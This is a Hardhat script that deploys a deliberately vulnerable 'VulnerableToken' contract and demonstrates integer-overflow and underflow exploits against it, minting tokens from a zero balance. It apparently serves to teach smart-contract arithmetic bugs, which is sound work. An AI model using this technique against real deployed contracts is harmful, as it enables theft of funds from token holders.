const { ethers } = require("hardhat");

async function main() {
  const [attacker] = await ethers.getSigners();

  console.log("=== Deploying VulnerableToken ===");

  // Deploy the updated VulnerableToken contract
  const VulnerableTokenFactory = await ethers.getContractFactory("VulnerableToken", attacker);
  const vulnerableToken = await VulnerableTokenFactory.deploy();
  console.log("VulnerableToken deployed at:", vulnerableToken.target);

  console.log("\n=== Integer Overflow Exploit on Counter ===");

  // Check the initial counter value (should be 0)
  let counterValue = await vulnerableToken.counter();
  console.log("Initial counter value:", counterValue.toString()); // Expected: 0

  // Step 1: Increment by 250
  let tx = await vulnerableToken.increment(250);
  await tx.wait();
  counterValue = await vulnerableToken.counter();
  console.log("Counter value after incrementing by 250:", counterValue.toString()); // Expected: 250

  // Step 2: Increment by 10 to trigger overflow (250 + 10 = 260, which wraps to 4 for uint8)
  tx = await vulnerableToken.increment(10);
  await tx.wait();
  counterValue = await vulnerableToken.counter();
  console.log("Counter value after incrementing by 10 (overflow expected):", counterValue.toString()); // Expected: 4

  console.log("\n=== Integer Underflow Exploit on Balances ===");

  // Check the initial token balance of the attacker (should be 0)
  let tokenBalance = await vulnerableToken.balances(attacker.address);
  console.log("Initial token balance:", tokenBalance.toString()); // Expected: 0

  // Exploit Underflow: Call spend(1) when balance is 0
  // With unchecked subtraction, 0 - 1 wraps to 255 for a uint8
  tx = await vulnerableToken.spend(1);
  await tx.wait();

  tokenBalance = await vulnerableToken.balances(attacker.address);
  console.log("Token balance after underflow exploit (expected 255):", tokenBalance.toString());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("Error executing exploit:", error);
    process.exit(1);
  });
